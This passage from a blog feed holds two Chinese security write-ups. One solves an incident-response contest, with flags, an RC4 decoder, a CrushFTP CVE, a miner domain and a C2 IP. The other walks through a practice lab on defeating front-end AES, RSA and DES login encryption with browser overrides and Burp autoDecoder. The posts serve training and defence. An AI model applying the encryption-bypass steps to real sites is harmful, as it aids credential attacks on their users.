    </categories>
    
    
    <tags>
      
      <tag>RCE 春秋云镜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025年Solar应急响应公益月赛-5月</title>
    <link href="/2025/06/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-5%E6%9C%88/"/>
    <url>/2025/06/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-5%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><p>打开 ConsoleApplication2.vcxproj 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/807cc719c562c9b7.png" alt="image-20250531150015351"></p><p>丢入CyberChef 解密</p><p><img src="https://img.dkdun.cn/v1/2025/12/daac402461fa3e11.png" alt="image-20250531150828101"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">target = <span class="hljs-string">&quot;LHDh1x1zdIiVS+a5qYJrBPb0ixqHTxd+uJ/3tckUdOqG+mn113E=&quot;</span>;<span class="hljs-variable">$k</span>=<span class="hljs-string">&quot;FixedKey123!&quot;</span>;<span class="hljs-variable">$d</span>=[System.Text.Encoding]::UTF8.GetBytes((Read-Host &quot;输入字符串&quot;));<span class="hljs-variable">$s</span>=0..255;<span class="hljs-variable">$j</span>=0;0..255|%&#123;<span class="hljs-variable">$j</span>=(<span class="hljs-variable">$j</span>+<span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>]+[byte]<span class="hljs-variable">$k</span>[<span class="hljs-variable">$_</span>%<span class="hljs-variable">$k</span>.Length])%256;<span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>]=<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>]&#125;;<span class="hljs-variable">$i</span>=<span class="hljs-variable">$j</span>=0;<span class="hljs-variable">$r</span>=@();<span class="hljs-variable">$d</span>|%&#123;<span class="hljs-variable">$i</span>=(<span class="hljs-variable">$i</span>+1)%256;<span class="hljs-variable">$j</span>=(<span class="hljs-variable">$j</span>+<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>])%256;<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>]=<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>];<span class="hljs-variable">$r</span>+=<span class="hljs-variable">$_</span>-bxor<span class="hljs-variable">$s</span>[(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]+<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>])%256]&#125;; [System.Convert]::ToBase64String(<span class="hljs-variable">$r</span>) -eq <span class="hljs-variable">$target</span></span><br></code></pre></td></tr></table></figure><p>简单 base64 和 RC4 加密，解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-comment"># KSA</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-comment"># PRGA</span><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        out.append(byte ^ K)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>target_base64 = <span class="hljs-string">&quot;LHDh1x1zdIiVS+a5qYJrBPb0ixqHTxd+uJ/3tckUdOqG+mn113E=&quot;</span><br>ciphertext = base64.b64decode(target_base64)<br>key = <span class="hljs-string">b&quot;FixedKey123!&quot;</span><br><br>plaintext = rc4(ciphertext, key)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果（UTF-8）:&quot;</span>, plaintext.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败，原文可能不是 UTF-8。原始内容为（十六进制）:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(plaintext.<span class="hljs-built_in">hex</span>())<br><br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;rqweripqwe[rqwe[rjqw[eprjqweprij&#125;</span><br></code></pre></td></tr></table></figure><h1 id="系统每天晚上系统都会卡卡的帮小明找到问题出在了那？"><a href="#系统每天晚上系统都会卡卡的帮小明找到问题出在了那？" class="headerlink" title="系统每天晚上系统都会卡卡的帮小明找到问题出在了那？"></a>系统每天晚上系统都会卡卡的帮小明找到问题出在了那？</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">题目描述<br><span class="hljs-built_in">flag</span>为配置名称（无空格）<br><span class="hljs-built_in">flag</span>&#123;xxxxx&#125;<br></code></pre></td></tr></table></figure><p>查看计划任务发现每天晚上都会触发</p><p><img src="https://img.dkdun.cn/v1/2025/12/960ed8afbb18b678.png" alt="image-20250531112655794"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;sqlbackingup&#125;</span><br></code></pre></td></tr></table></figure><h1 id="攻击者使用什么漏洞获取了服务器的配置文件？"><a href="#攻击者使用什么漏洞获取了服务器的配置文件？" class="headerlink" title="攻击者使用什么漏洞获取了服务器的配置文件？"></a>攻击者使用什么漏洞获取了服务器的配置文件？</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">题目描述<br>某某文化有限公司的运维小王刚刚搭建服务器发现cpu莫名的异常的升高请你帮助小王排查一下服务器<br><span class="hljs-symbol">pass:</span>Ngy<span class="hljs-subst">@667788</span><br>flag格式为：flag&#123;CVE<span class="hljs-number">-2020</span><span class="hljs-number">-12345</span>&#125;<br></code></pre></td></tr></table></figure><p>搜索 CrushFTPCVE 找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31161">CVE-2025-31161</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">31161</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="恶意域名是什么？"><a href="#恶意域名是什么？" class="headerlink" title="恶意域名是什么？"></a>恶意域名是什么？</h1><p>执行脚本直接挖矿</p><p><img src="https://img.dkdun.cn/v1/2025/12/33375800b1fac575.png" alt="image-20250531111921005"></p><p>发现域名</p><p><img src="https://img.dkdun.cn/v1/2025/12/2e2eb3c0763e74de.png" alt="image-20250531111724214"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flag&#123;<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.oracleservice</span>.<span class="hljs-attribute">top</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="疑似是什么组织发动的攻击？"><a href="#疑似是什么组织发动的攻击？" class="headerlink" title="疑似是什么组织发动的攻击？"></a>疑似是什么组织发动的攻击？</h1><p>根据的 b.oracleservice.top 域名找到相关信息：8220 组织</p><p><img src="https://img.dkdun.cn/v1/2025/12/3d2816f2bfe6a47b.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">8220</span>Gang&#125;<br></code></pre></td></tr></table></figure><h1 id="攻击者C2服务器IP是什么？"><a href="#攻击者C2服务器IP是什么？" class="headerlink" title="攻击者C2服务器IP是什么？"></a>攻击者C2服务器IP是什么？</h1><p>查看日志，发现下载了 ps 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/ef504118092a3efa.png" alt="image-20250531171445456"></p><p>然后找到 IP </p><p><img src="https://img.dkdun.cn/v1/2025/12/962f2a2a1e080292.png" alt="image-20250531172207174"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">156.238.230.57</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探 JS 逆向之 encrypt-labs</title>
    <link href="/2025/05/27/JS-%E9%80%86%E5%90%91%E4%B9%8B-encrypt-labs/"/>
    <url>/2025/05/27/JS-%E9%80%86%E5%90%91%E4%B9%8B-encrypt-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学长推荐的一个靶场，对于 js 这一块还没接触过，所以来打打，感觉还是挺不错的</p><blockquote><p>项目地址：<a href="https://github.com/SwagXz/encrypt-labs">https://github.com/SwagXz/encrypt-labs</a></p><p>作者：SwagXz</p></blockquote><p>burp 自动加解密插件 autoDeceder：<a href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a> (有时候会有点小问题)</p><p>浏览器插件：<a href="https://ctool.dev/">https://ctool.dev/</a></p><h1 id="AES-固定-key"><a href="#AES-固定-key" class="headerlink" title="AES 固定 key"></a>AES 固定 key</h1><p>乱输，然后抓包</p><img src="https://img.dkdun.cn/v1/2025/12/03f020ec19d93395.png" style="zoom:67%;" /><p>发现了 <code>encryptedData</code> 加密参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br><span class="hljs-string">&quot;encryptedData&quot;</span>: <span class="hljs-string">&quot;nArXfVdnoe67UzojAPP2X+6qSiznLMBAI3a5Bi+zlNx05J187TZuSqk/iecDaXCv&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/e1aa6e7d7b152f79.png" style="zoom: 50%;" /><p>查看 js 代码搜索关键字找到了 aes 加密代码，CBC 模式的 AES 加密，下断点执行，有固定的 key 和 iv，可以直接还原明文</p><img src="https://img.dkdun.cn/v1/2025/12/0f98298f996105b4.png" style="zoom: 33%;" /><p>key 和 iv</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br></code></pre></td></tr></table></figure><p>明文数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;111&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="AES-服务端获取-Key"><a href="#AES-服务端获取-Key" class="headerlink" title="AES 服务端获取 Key"></a>AES 服务端获取 Key</h1><p>起了两个请求，分别获取 aes_key 和 aes_iv，然后利用算法对数据进行加密传输</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;aes_key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;yC1rjcwgTO\/OFlmZteNzoQ==&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;aes_iv&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;8RQcaNn16DrwppYR+rrURg==&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/a6f0b6d7a8cbb65a.png" style="zoom:50%;" /><p>搜索关键字定位到算法部分，发现服务器请求获取 key 和 iv ，重发数据包发现 key 和 iv 短时间内不会发生变化</p><img src="https://img.dkdun.cn/v1/2025/12/7fce5520d2422ea3.png" style="zoom:50%;" /><p>autoDecoder 配置</p><img src="https://img.dkdun.cn/v1/2025/12/de8de9afc713e97f.png" style="zoom: 50%;" /><p>解密成功</p><img src="https://img.dkdun.cn/v1/2025/12/04eb77ad502fb2a0.png"  /><h1 id="RSA-加密"><a href="#RSA-加密" class="headerlink" title="RSA 加密"></a>RSA 加密</h1><p>抓包拿到数据，出现 data 参数</p><img src="https://img.dkdun.cn/v1/2025/12/0511c7c872998b5a.png" style="zoom: 50%;" /><p>搜索关键字，找到加密代码，打个断点调试</p><img src="https://img.dkdun.cn/v1/2025/12/8cd1553717967864.png" style="zoom: 50%;" /><p>拿到数据，只有公钥，没有私钥，只能加密</p><img src="https://img.dkdun.cn/v1/2025/12/91e837c918197e02.png" style="zoom: 33%;" /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">-----<span class="hljs-variable constant_">BEGIN</span> <span class="hljs-variable constant_">PUBLIC</span> <span class="hljs-variable constant_">KEY</span>-----<br><span class="hljs-title class_">MIGfMA</span>0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi<br><span class="hljs-variable constant_">NH</span>+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM<br><span class="hljs-title class_">DSj92Mr3</span>xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb<br>ocDbsNeCwNpRxwjIdQIDAQAB<br>-----<span class="hljs-variable constant_">END</span> <span class="hljs-variable constant_">PUBLIC</span> <span class="hljs-variable constant_">KEY</span>-----<br></code></pre></td></tr></table></figure><p>autoDecoder 配置</p><img src="https://img.dkdun.cn/v1/2025/12/dd4ead25cf7e4995.png" style="zoom: 33%;" /><img src="https://img.dkdun.cn/v1/2025/12/14dae204bc48dca6.png" style="zoom: 50%;" /><h1 id="AES-RSA-加密"><a href="#AES-RSA-加密" class="headerlink" title="AES + RSA 加密"></a>AES + RSA 加密</h1><p>抓包看数据</p><img src="https://img.dkdun.cn/v1/2025/12/208f330bc5c32b5a.png" style="zoom: 40%;" /><p>搜索关键参数查找加密算法，下断点获取数据</p><img src="https://img.dkdun.cn/v1/2025/12/7afa1fe5bf7c235d.png" style="zoom: 40%;" /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sendDataAesRsa</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> formData = &#123;<br><span class="hljs-attr">username</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>)<br>.<span class="hljs-property">value</span>,<br><span class="hljs-attr">password</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>.<span class="hljs-property">value</span><br>&#125;;<br><span class="hljs-keyword">const</span> jsonData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(formData);<br><br><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">lib</span>.<span class="hljs-property">WordArray</span>.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>);<br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">lib</span>.<span class="hljs-property">WordArray</span>.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>);<br><br><span class="hljs-keyword">const</span> encryptedData = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">AES</span>.<span class="hljs-title function_">encrypt</span>(jsonData, key, &#123;<br><span class="hljs-attr">iv</span>: iv,<br><span class="hljs-attr">mode</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">mode</span>.<span class="hljs-property">CBC</span>,<br><span class="hljs-attr">padding</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">pad</span>.<span class="hljs-property">Pkcs7</span><br>&#125;)<br>.<span class="hljs-title function_">toString</span>();<br><br><span class="hljs-keyword">const</span> rsa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSEncrypt</span>();<br>rsa.<span class="hljs-title function_">setPublicKey</span>(<span class="hljs-string">`-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="hljs-string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="hljs-string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="hljs-string">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----`</span>);<br><br><span class="hljs-keyword">const</span> encryptedKey = rsa.<span class="hljs-title function_">encrypt</span>(key.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>));<br><span class="hljs-keyword">const</span> encryptedIv = rsa.<span class="hljs-title function_">encrypt</span>(iv.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>));<br></code></pre></td></tr></table></figure><p>被加密的参数是 <code>formData</code> 也就是 <code>&quot;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&quot;</code></p><img src="https://img.dkdun.cn/v1/2025/12/c3517fc45108b450.png" style="zoom:67%;" /><p>经过 <code>AES</code> 加密，但加密使用的 <code>key</code> 和 <code>iv</code> 是16位随机数，得到 <code>encryptedData</code>，然后对 <code>key</code> 和 <code>iv </code>进行 <code>rsa</code> 加密得到<code>encryptedKey</code> 和  <code>encryptedIv</code>，再将这三个参数传入数据包中发包进行验证</p><p><img src="https://img.dkdun.cn/v1/2025/12/a582e861bce2da11.png"></p><p>将随机 16 位的 <code>key</code> 和 <code>iv</code> 进行固定，右键选择替换内容，使用本地替换的方式固定 <code>key</code> 和 <code>iv</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br></code></pre></td></tr></table></figure><p>右键浏览器（从 Firefox 换成了 Chrome）替换，选择本地替换，新建一个 js 文件替换</p><img src="https://img.dkdun.cn/v1/2025/12/bd63b1fe239a21dd.png" style="zoom: 80%;" /><p>下断点调试</p><img src="https://img.dkdun.cn/v1/2025/12/d77f41bbd5ebc7e9.png" style="zoom: 40%;" /><img src="https://img.dkdun.cn/v1/2025/12/5f0b4d5241e75cbc.png" style="zoom:40%;" /><p>经过几次登录发现 encryptedData 不会变，但 Key 和 Iv 会改变，说明修改成功了</p><img src="https://img.dkdun.cn/v1/2025/12/25b34044557d69d1.png" style="zoom: 50%;" /><p>autoDecoder 配置和之前一样，解密成功</p><h1 id="Des-规律-Key"><a href="#Des-规律-Key" class="headerlink" title="Des 规律 Key"></a>Des 规律 Key</h1><p>抓包拿到数据，只对 <code>password</code> 进行了加密</p><img src="https://img.dkdun.cn/v1/2025/12/0735abcfa6c33853.png" style="zoom:67%;" /><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;3981f487c5afde43&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>加密算法比较简单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">encryptAndSendDataDES</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><span class="hljs-keyword">const</span> password = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><br><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(username.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>)<br>.<span class="hljs-title function_">padEnd</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;6&#x27;</span>));<br><br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;9999&#x27;</span> + username.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>)<br>.<span class="hljs-title function_">padEnd</span>(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;9&#x27;</span>));<br><br><span class="hljs-keyword">const</span> encryptedPassword = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">DES</span>.<span class="hljs-title function_">encrypt</span>(password, key, &#123;<br><span class="hljs-attr">iv</span>: iv,<br><span class="hljs-attr">mode</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">mode</span>.<span class="hljs-property">CBC</span>,<br><span class="hljs-attr">padding</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">pad</span>.<span class="hljs-property">Pkcs7</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> encryptedHex = encryptedPassword.<span class="hljs-property">ciphertext</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>);<br></code></pre></td></tr></table></figure><p>简单的 <code>DES</code> 加密，<code>key</code> 和 <code>iv</code> 都使用了<code>username</code> 的值，<code>key</code> 是 8 位，如果 <code>username</code> 不满 8 位则用 6 补满，<code>iv</code> 是 8 位，<code>9999 + username</code> 的前四位，所以输入 admin，key 和 iv 值如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">key：admin666<br>iv：9999admi<br></code></pre></td></tr></table></figure><p>autoDecoder 解密</p><img src="https://img.dkdun.cn/v1/2025/12/bf931770dbb5ac1e.png" style="zoom:67%;" /><h1 id="明文加签"><a href="#明文加签" class="headerlink" title="明文加签"></a>明文加签</h1><p>抓包拿到数据，多了两个参数分别是 <code>nonce</code>，<code>signature</code> ，还有个时间戳</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nonce&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;r4nauns4od&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1748175966</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;signature&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;9ffc131e7a68507c6338362ff38e1450ab12ccf22fc97d439115462566047ba7&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>加密算法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sendDataWithNonce</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><span class="hljs-keyword">const</span> password = 